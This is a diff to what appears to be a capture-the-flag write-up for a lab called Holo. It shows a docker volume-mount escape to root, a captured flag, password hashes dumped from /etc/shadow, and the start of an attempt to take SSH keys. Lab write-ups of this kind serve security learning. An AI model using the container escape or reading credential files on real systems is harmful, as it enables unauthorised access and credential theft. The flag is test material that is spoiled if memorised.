@@ -107,3 +107,25 @@ docker run -v /:/mnt --rm -it 56def654ec22 chroot /mnt sh
 
 I was not able to find the root flag so we have repository name with ubuntu 18.04
 
+
+So this time we get the right shell and got the root.txt so i have to keep this in mind that it was a loop hole and i have to do some smart work and choose the right way
+```
+# cat root.txt
+cat root.txt
+HOLO{e16581b01d445a05adb2e6d45eb373f7}
+```
+
+
+I have cat the /etc/shadow and got some hashes
+```
+ubuntu:!$6$6/mlN/Q.1gopcuhc$7ymOCjV3RETFUl6GaNbau9MdEGS6NgeXLM.CDcuS5gNj2oIQLpRLzxFuAwG0dGcLk1NX70EVzUUKyUQOezaf0.:18601:0:99999:7:::
+```
+
+```
+linux-admin:$6$Zs4KmlUsMiwVLy2y$V8S5G3q7tpBMZip8Iv/H6i5ctHVFf6.fS.HXBw9Kyv96Qbc2ZHzHlYHkaHm8A5toyMA3J53JU.dc6ZCjRxhjV1:18570:0:99999:7:::
+```
+
+Let's see if we can get the .ssh keys fingers closed
+```
+
+```
